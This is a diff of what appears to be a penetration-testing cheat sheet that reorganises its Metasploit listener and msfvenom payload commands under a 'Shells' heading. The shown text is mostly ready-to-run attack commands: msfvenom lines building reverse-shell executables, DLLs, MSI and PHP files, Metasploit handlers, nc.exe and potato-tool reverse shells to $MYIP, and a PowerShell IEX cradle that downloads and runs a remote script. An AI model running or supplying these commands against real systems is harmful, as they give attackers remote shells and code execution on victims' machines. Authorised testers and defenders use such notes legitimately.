@@ -94,31 +94,6 @@ wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
 # Exploitation
-## Listeners
-rlwrap nc -lvnp 5555
-rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 1; set payload windows/x64/meterpreter/reverse_tcp; run"
-rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 0; set payload windows/meterpreter/reverse_tcp; run"
-rlwrap msfconsole -q -x "use multi/handler; set payload php/reverse_php; set LHOST $MYIP; set LPORT 5555; run"
-rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
-rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/powershell_reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
-
-## MSFVenom
-msfvenom -p php/reverse_php LHOST=$MYIP LPORT=5555 -f raw -o shell.php
-msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.php
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
-msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
-msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
-msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.py
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
-
 ## File Transfer
 python3 -m http.server 80 -d ~/Upload
 powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://$MYIP/tools.ps1''); dir C:\programdata\tmp"
@@ -284,9 +259,35 @@ git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f
 
 ## Infrastructure
 [*] Shells
++---------- Reverse ----------+
 C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd.exe
 C:\programdata\tmp\EfsPotato.exe "C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd"
 C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
+
++---------- Listeners ----------+
+rlwrap nc -lvnp 5555
+rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 1; set payload windows/x64/meterpreter/reverse_tcp; run"
+rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 0; set payload windows/meterpreter/reverse_tcp; run"
+rlwrap msfconsole -q -x "use multi/handler; set payload php/reverse_php; set LHOST $MYIP; set LPORT 5555; run"
+rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
+rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/powershell_reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
+
++---------- MSFVenom ----------+
+msfvenom -p php/reverse_php LHOST=$MYIP LPORT=5555 -f raw -o shell.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.php
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
+msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o shell.dll
+msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f msi -o shell.msi
+msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.py
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
 
 [*] (21) FTP
 wget -m -q --no-parent --cut-dirs=1 --no-directories -P ftp ftp://$TARGET
